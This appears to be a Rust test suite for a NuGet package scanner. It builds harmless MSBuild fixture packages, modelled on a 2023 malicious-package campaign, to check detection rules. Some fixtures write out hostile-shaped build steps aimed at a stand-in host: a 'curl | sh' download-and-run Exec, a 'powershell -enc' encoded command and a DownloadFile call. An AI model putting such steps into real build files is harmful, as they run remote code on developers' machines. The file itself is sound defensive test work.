//! Must-catch and must-not-catch tests for the MSBuild rules. Each package
//! is built here from the description in the public write-ups of the 2023
//! campaign (the `ReversingLabs` write-up of 2023-10-31). Nothing in them does anything: the
//! commands name `example.invalid`, and the "payload" is harmless text.

use crate::common::{TestResult, customs, findings, temp_file, zip};

const INLINE_TASK: &str = r#"<Project>
  <UsingTask TaskName="Fetch" TaskFactory="RoslynCodeTaskFactory"
             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        System.Console.WriteLine("fixture: an inline task that does nothing");
      </Code>
    </Task>
  </UsingTask>
  <Target Name="Fetch" BeforeTargets="Build">
    <Fetch />
  </Target>
</Project>
"#;

fn scan(name: &str, entries: &[(&str, &[u8])]) -> TestResult<(i32, serde_json::Value, String)> {
    let dir = temp_file(name, &zip(entries)?)?;
    let json = customs(dir.path(), &["scan", name, "--format", "json"])?;
    let text = customs(dir.path(), &["scan", name])?;
    Ok((json.code, json.json()?, text.stdout))
}

fn message(finding: &serde_json::Value) -> &str {
    finding["message"].as_str().unwrap_or_default()
}

#[test]
fn an_inline_task_in_the_build_entry_point_is_c201() -> TestResult {
    let (code, report, text) = scan(
        "contoso.inline.1.0.0.nupkg",
        &[("build/Contoso.Inline.targets", INLINE_TASK.as_bytes())],
    )?;
    let inline = findings(&report, "C201");
    assert_eq!(inline.len(), 1, "{report}");
    assert_eq!(inline[0]["severity"], "error");
    assert_eq!(inline[0]["path"], "build/Contoso.Inline.targets");
    assert_eq!(inline[0]["line"], 2);
    assert!(
        inline[0]["evidence"]
            .as_str()
            .unwrap_or_default()
            .contains("RoslynCodeTaskFactory")
    );
    assert!(!message(inline[0]).contains("not imported"), "{report}");
    assert!(text.contains("build/Contoso.Inline.targets:2"), "{text}");
    assert_eq!(code, 1);
    Ok(())
}

#[test]
fn an_inline_task_reached_only_through_an_import_is_c201() -> TestResult {
    let entry = br#"<Project>
  <Import Project="$(MSBuildThisFileDirectory)tasks\a.targets" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.imported.1.0.0.nupkg",
        &[
            ("build/Contoso.Imported.targets", entry),
            ("build/tasks/a.targets", INLINE_TASK.as_bytes()),
        ],
    )?;
    let inline = findings(&report, "C201");
    assert_eq!(inline.len(), 1, "{report}");
    assert_eq!(inline[0]["path"], "build/tasks/a.targets");
    assert!(
        !message(inline[0]).contains("not imported"),
        "the import was not followed: {report}"
    );
    assert!(findings(&report, "C207").is_empty(), "{report}");
    Ok(())
}

#[test]
fn the_factories_that_load_a_compiled_assembly_are_c202_not_c201() -> TestResult {
    // TaskHostFactory and AssemblyTaskFactory are MSBuild's own factories
    // for a task assembly; they compile nothing. A factory named through a
    // property could be anything, so it stays C201.
    let targets = br#"<Project>
  <UsingTask TaskName="A" TaskFactory="TaskHostFactory" AssemblyFile="$(MSBuildThisFileDirectory)A.dll" />
  <UsingTask TaskName="B" TaskFactory="assemblytaskfactory" AssemblyFile="$(MSBuildThisFileDirectory)A.dll" />
  <UsingTask TaskName="C" TaskFactory="$(SomeFactory)" AssemblyFile="$(MSBuildThisFileDirectory)A.dll" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.hosted.1.0.0.nupkg",
        &[
            ("build/Contoso.Hosted.targets", targets),
            ("build/A.dll", b"MZ"),
        ],
    )?;
    let inline = findings(&report, "C201");
    assert_eq!(inline.len(), 1, "{report}");
    assert!(
        inline[0]["evidence"]
            .as_str()
            .unwrap_or_default()
            .contains("$(SomeFactory)")
    );
    assert_eq!(findings(&report, "C202").len(), 3, "{report}");
    Ok(())
}

#[test]
fn an_inline_task_in_build_transitive_is_c201() -> TestResult {
    let (_, report, _) = scan(
        "contoso.transitive.1.0.0.nupkg",
        &[(
            "buildTransitive/net8.0/Contoso.Transitive.props",
            INLINE_TASK.as_bytes(),
        )],
    )?;
    assert_eq!(findings(&report, "C201").len(), 1, "{report}");
    Ok(())
}

#[test]
fn an_inline_task_in_a_file_no_entry_point_imports_is_reported_with_a_note() -> TestResult {
    let (_, report, _) = scan(
        "contoso.stray.1.0.0.nupkg",
        &[
            ("build/Contoso.Stray.targets", b"<Project />"),
            ("build/tasks/hidden.targets", INLINE_TASK.as_bytes()),
        ],
    )?;
    let inline = findings(&report, "C201");
    assert_eq!(inline.len(), 1, "{report}");
    assert!(message(inline[0]).contains("not imported"), "{report}");
    Ok(())
}

#[test]
fn exec_with_a_download_is_c203_and_c205() -> TestResult {
    let targets = br#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="curl -s https://example.invalid/i | sh" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.exec.1.0.0.nupkg",
        &[("build/Contoso.Exec.targets", targets)],
    )?;
    let exec = findings(&report, "C203");
    assert_eq!(exec.len(), 1, "{report}");
    assert_eq!(exec[0]["line"], 3);
    assert_eq!(
        exec[0]["evidence"],
        "curl -s https://example.invalid/i | sh"
    );
    let url = findings(&report, "C205");
    assert_eq!(url.len(), 1, "{report}");
    assert_eq!(url[0]["evidence"], "https://example.invalid/i");
    Ok(())
}

#[test]
fn exec_in_any_case_is_c203_because_msbuild_matches_task_names_ignoring_case() -> TestResult {
    let targets = br#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <EXEC command="echo fixture" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.shout.1.0.0.nupkg",
        &[("build/Contoso.Shout.targets", targets)],
    )?;
    let exec = findings(&report, "C203");
    assert_eq!(exec.len(), 1, "{report}");
    assert_eq!(exec[0]["evidence"], "echo fixture");
    Ok(())
}

#[test]
fn download_file_is_c204() -> TestResult {
    let targets = br#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <DownloadFile SourceUrl="https://example.invalid/tool.zip" DestinationFolder="$(IntermediateOutputPath)" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.download.1.0.0.nupkg",
        &[("build/Contoso.Download.targets", targets)],
    )?;
    let download = findings(&report, "C204");
    assert_eq!(download.len(), 1, "{report}");
    assert_eq!(download[0]["evidence"], "https://example.invalid/tool.zip");
    Ok(())
}

#[test]
fn a_base64_payload_is_c206() -> TestResult {
    // Harmless text, base64-encoded: "fixture text, not a payload.  "
    // repeated eight times, 320 characters with no padding inside.
    let payload = "Zml4dHVyZSB0ZXh0LCBub3QgYSBwYXlsb2FkLiAg".repeat(8);
    let targets = format!(
        r#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="powershell -enc {payload}" />
  </Target>
</Project>
"#
    );
    let (_, report, _) = scan(
        "contoso.encoded.1.0.0.nupkg",
        &[("build/Contoso.Encoded.targets", targets.as_bytes())],
    )?;
    assert_eq!(findings(&report, "C206").len(), 1, "{report}");
    assert_eq!(findings(&report, "C203").len(), 1, "{report}");
    Ok(())
}

#[test]
fn init_ps1_in_tools_is_c103() -> TestResult {
    let (_, report, _) = scan(
        "contoso.script.1.0.0.nupkg",
        &[("tools/init.ps1", b"# fixture: does nothing")],
    )?;
    assert_eq!(findings(&report, "C103").len(), 1, "{report}");
    Ok(())
}

#[test]
fn an_exec_whose_command_is_a_property_is_reported_with_the_literal_text() -> TestResult {
    let targets = br#"<Project>
  <PropertyGroup>
    <Scheme>https</Scheme>
    <Cmd>echo fixture</Cmd>
  </PropertyGroup>
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="$(Cmd) $(Scheme)://$(Host)/path" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.property.1.0.0.nupkg",
        &[("build/Contoso.Property.targets", targets)],
    )?;
    let exec = findings(&report, "C203");
    assert_eq!(exec.len(), 1, "{report}");
    assert_eq!(exec[0]["evidence"], "$(Cmd) $(Scheme)://$(Host)/path");
    // The URL is assembled from properties: customs does not see it.
    assert!(findings(&report, "C205").is_empty(), "{report}");
    Ok(())
}

#[test]
fn urls_in_comments_are_ignored_and_urls_in_cdata_are_not() -> TestResult {
    let targets = b"<Project>
  <!-- see https://example.invalid/comment -->
  <PropertyGroup>
    <Notes><![CDATA[fetch https://example.invalid/cdata]]></Notes>
  </PropertyGroup>
</Project>
";
    let (_, report, _) = scan(
        "contoso.comments.1.0.0.nupkg",
        &[("build/Contoso.Comments.targets", targets)],
    )?;
    let urls = findings(&report, "C205");
    assert_eq!(urls.len(), 1, "{report}");
    assert_eq!(urls[0]["evidence"], "https://example.invalid/cdata");
    assert_eq!(urls[0]["line"], 4);
    Ok(())
}

fn utf16(text: &str, big_endian: bool) -> Vec<u8> {
    let mut out = if big_endian {
        vec![0xFE, 0xFF]
    } else {
        vec![0xFF, 0xFE]
    };
    for unit in text.encode_utf16() {
        if big_endian {
            out.extend(unit.to_be_bytes());
        } else {
            out.extend(unit.to_le_bytes());
        }
    }
    out
}

#[test]
fn utf16_files_in_both_byte_orders_are_read() -> TestResult {
    for big_endian in [false, true] {
        let bytes = utf16(INLINE_TASK, big_endian);
        let (_, report, _) = scan(
            "contoso.wide.1.0.0.nupkg",
            &[("build/Contoso.Wide.targets", &bytes)],
        )?;
        let inline = findings(&report, "C201");
        assert_eq!(inline.len(), 1, "big endian {big_endian}: {report}");
        assert_eq!(inline[0]["line"], 2);
        assert!(findings(&report, "C004").is_empty(), "{report}");
    }
    Ok(())
}

#[test]
fn a_dtd_or_another_encoding_is_c004_and_the_file_is_still_read() -> TestResult {
    let dtd =
        format!("<?xml version=\"1.0\"?>\n<!DOCTYPE Project [ <!ENTITY e \"x\"> ]>\n{INLINE_TASK}");
    let latin = format!("<?xml version=\"1.0\" encoding=\"windows-1252\"?>\n{INLINE_TASK}");
    for (name, content, line) in [("dtd", dtd, 4), ("latin", latin, 3)] {
        let (_, report, _) = scan(
            "contoso.odd.1.0.0.nupkg",
            &[("build/Contoso.Odd.targets", content.as_bytes())],
        )?;
        assert_eq!(findings(&report, "C004").len(), 1, "{name}: {report}");
        let inline = findings(&report, "C201");
        assert_eq!(inline.len(), 1, "{name}: not read: {report}");
        assert_eq!(inline[0]["line"], line, "{name}");
    }
    Ok(())
}

#[test]
fn a_file_that_is_not_well_formed_is_c004() -> TestResult {
    let (_, report, _) = scan(
        "contoso.broken.1.0.0.nupkg",
        &[("build/Contoso.Broken.targets", b"<Project><Target>")],
    )?;
    assert_eq!(findings(&report, "C004").len(), 1, "{report}");
    Ok(())
}

#[test]
fn imports_that_leave_the_package_or_use_properties_are_c207() -> TestResult {
    let entry = br#"<Project>
  <Import Project="$(MSBuildThisFileDirectory)..\..\..\outside.targets" />
  <Import Project="$(SomeSdkPath)\Sdk.targets" />
  <Import Project="Sdk.targets" Sdk="Microsoft.NET.Sdk" />
  <Import Project="missing.targets" />
  <Import Project="$(MSBuildThisFileDirectory)b.targets" />
</Project>
"#;
    // b imports the entry point back: a cycle must not hang the scan.
    let back = br#"<Project>
  <Import Project="Contoso.Imports.targets" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.imports.1.0.0.nupkg",
        &[
            ("build/Contoso.Imports.targets", entry),
            ("build/b.targets", back),
        ],
    )?;
    let unresolved = findings(&report, "C207");
    assert_eq!(unresolved.len(), 3, "{report}");
    assert!(unresolved.iter().all(|f| f["severity"] == "note"));
    Ok(())
}

#[test]
fn a_task_assembly_named_by_using_task_is_build_time_code() -> TestResult {
    let entry = br#"<Project>
  <UsingTask TaskName="Generate" AssemblyFile="$(MSBuildThisFileDirectory)..\tasks\Contoso.Tasks.dll" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.tasks.1.0.0.nupkg",
        &[
            ("build/Contoso.Tasks.targets", entry),
            ("tasks/Contoso.Tasks.dll", b"MZ"),
            ("tools/net8.0/Contoso.Tool.dll", b"MZ"),
            ("lib/net8.0/Contoso.Tasks.Lib.dll", b"MZ"),
        ],
    )?;
    assert_eq!(findings(&report, "C202").len(), 1, "{report}");
    let assets = report["packages"][0]["assets"]
        .as_array()
        .ok_or("no assets")?;
    let role = |path: &str| {
        assets
            .iter()
            .find(|a| a["path"] == path)
            .map(|a| a["role"].clone())
    };
    assert_eq!(role("tasks/Contoso.Tasks.dll"), Some("build_time".into()));
    assert_eq!(
        role("tools/net8.0/Contoso.Tool.dll"),
        Some("build_time".into())
    );
    assert_eq!(role("lib/net8.0/Contoso.Tasks.Lib.dll"), Some("lib".into()));
    Ok(())
}

#[test]
fn the_id_and_version_of_a_nupkg_come_from_its_nuspec() -> TestResult {
    let nuspec = br#"<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>Contoso.Real.Name</id>
    <version>2.0.0-Beta.1</version>
  </metadata>
</package>
"#;
    let (_, report, _) = scan(
        "renamed.nupkg",
        &[
            ("Contoso.Real.Name.nuspec", nuspec),
            ("lib/net8.0/A.dll", b"MZ"),
        ],
    )?;
    assert_eq!(report["packages"][0]["id"], "Contoso.Real.Name");
    assert_eq!(report["packages"][0]["version"], "2.0.0-Beta.1");
    Ok(())
}
